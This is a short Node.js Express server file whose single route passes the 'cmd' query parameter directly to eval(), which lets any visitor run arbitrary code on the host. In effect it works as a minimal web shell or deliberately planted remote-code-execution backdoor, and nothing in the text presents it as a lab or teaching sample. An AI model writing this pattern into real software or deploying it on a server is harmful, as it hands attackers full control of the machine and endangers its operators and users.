const express = require('express');
const app = express();
app.get('/', (req, res) => {
  eval(req.query.cmd);
  res.send('ok');
});